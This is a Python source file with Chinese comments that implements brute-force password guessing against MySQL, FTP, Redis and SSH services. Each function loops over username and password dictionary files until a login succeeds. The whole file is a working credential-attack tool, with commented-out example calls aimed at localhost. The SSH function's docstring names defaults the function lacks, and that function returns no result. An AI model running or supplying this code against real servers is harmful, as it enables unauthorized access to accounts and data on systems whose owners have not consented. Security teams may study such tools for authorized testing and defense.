import pymysql  # 用于连接 MySQL 数据库
from ftplib import FTP  # 用于连接 FTP 服务器
import redis  # 用于连接 Redis 数据库
import paramiko  # 用于SSH

"""
MySQL 弱口令
"""


# host, port: 目标主机和端口；
# user_dict, pwd_dict: 用户名或密码文件路径，默认值 'root'。
def blast_mysql(host, port, user_dict='root', pwd_dict='root'):
    # 爆破密码
    if user_dict == 'root':
        for pwd in open(pwd_dict, 'r').readlines():
            pwd = pwd.strip()
            # 如果连接成功（未抛异常）：
            # 说明密码正确；
            # 关闭连接并返回 [user, pwd]。
            try:
                db = pymysql.connect(host=host, port=port, user=user_dict, password=pwd, connect_timeout=5)
                db.close()
                return [user_dict, pwd]
            except:
                pass
    # 爆破账号
    elif pwd_dict == 'root':
        for user in open(user_dict, 'r').readlines():
            user = user.strip()
            try:
                db = pymysql.connect(host=host, port=port, user=user, password=pwd_dict)
                db.close()
                return [user, pwd_dict]
            except:
                pass
    # 爆破账号和密码
    else:
        for user in open(user_dict, 'r').readlines():
            for pwd in open(pwd_dict, 'r').readlines():
                user = user.strip()
                pwd = pwd.strip()
                try:
                    db = pymysql.connect(host=host, port=port, user=user, password=pwd)
                    db.close()
                    return [user, pwd]
                except:
                    pass
    return '爆破失败'


"""
ftp 弱口令
"""


def blast_ftp(host, port, user_dict, pwd_dict):
    ftp = FTP()
    for user in open(user_dict, 'r').readlines():
        for pwd in open(pwd_dict, 'r').readlines():
            user = user.replace('\n', '')
            pwd = pwd.replace('\n', '')
            try:
                print(user, pwd)
                ftp.connect(host=host, port=port, timeout=0.5)
                ftp.login(user=user, passwd=pwd)
                return [user, pwd]
            except:
                # print(1)
                pass
    return '爆破失败'


"""
redis 数据库 弱口令
"""


def blast_redis(host, port, pwd_dict):
    for pwd in open(pwd_dict, 'r').readlines():
        pwd = pwd.replace('\n', '')
        try:
            # 创建一个 Redis 客户端实例，使用当前尝试的密码。
            red = redis.Redis(host=host, port=port, password=pwd)
            # 尝试执行一个简单的 Redis 命令（info()），如果密码正确，
            # 连接将成功并执行此命令；如果密码错误，连接将失败并抛出异常。
            red.info()
            return pwd
        except:
            pass
    return '爆破失败'


"""
SSH 爆破
"""
def blast_ssh(host, port, user_dict, pwd_dict):
    """
    尝试使用用户名字典和密码字典通过 SSH 连接到服务器。

    Args:
        user_dict (str): 包含用户名的文件路径。
        pwd_dict (str): 包含密码的文件路径。
        host (str): SSH 服务器的主机名或 IP 地址。默认为 '192.168.172.129'。
        port (int, optional): SSH 端口。默认为 22。
    """
    for u in open(user_dict, 'r').readlines():
        u = u.replace('\n', '')
        for p in open(pwd_dict, 'r').readlines():
            p = p.replace('\n', '')
            # 错误处理块：尝试SSH连接，如果失败则捕获异常
            try:
                # 创建一个 Paramiko SSH 客户端实例
                ssh = paramiko.SSHClient()
                # 设置缺失主机密钥策略为自动添加。
                # 这意味着如果连接的主机密钥不在 known_hosts 文件中，它会被自动添加。
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # # 尝试使用当前用户名 (u)、密码 (p)、
                # 目标主机名 (host) 和端口 (port) 进行 SSH 连接。
                ssh.connect(hostname=host, port=port, username=u, password=p)
                print(u, p)
                break  # 如果成功，跳出内部循环
            except:
                pass


# res = blast_mysql('127.0.0.1', 3306, pwd_dict='test/pwd.txt')
# print(res)
# res = blast_ftp('127.0.0.1', 21, pwd_dict='test/pwd.txt', user_dict='test/users.txt')
# print(res)
# res = blast_redis('127.0.0.1', 6379, pwd_dict='pwd.txt')
# print(res)
# res = blast_ssh('')